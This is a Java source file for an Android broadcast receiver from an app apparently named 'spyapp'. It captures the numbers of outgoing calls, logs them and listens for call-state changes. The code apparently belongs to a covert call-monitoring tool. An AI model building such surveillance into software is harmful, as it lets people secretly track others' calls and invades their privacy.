package com.app.spyapp.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.WriteLog;

public class CallBroadcastReceiver extends BroadcastReceiver {
    private SpyApp spyApp;

    public void onReceive(Context context, Intent intent) {
        spyApp = (SpyApp) context.getApplicationContext();
        WriteLog.E("CallRecorder", "CallBroadcastReceiver::onReceive got Intent: " + intent.toString());
        if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
            String numberToCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            spyApp.setOutgoingnumber(numberToCall);
            WriteLog.E("CallRecorder", "CallBroadcastReceiver intent has EXTRA_PHONE_NUMBER: " + numberToCall);
        }

        PhoneListener phoneListener = new PhoneListener(context);
        TelephonyManager telephony = (TelephonyManager)
                context.getSystemService(Context.TELEPHONY_SERVICE);
        telephony.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
    }
}
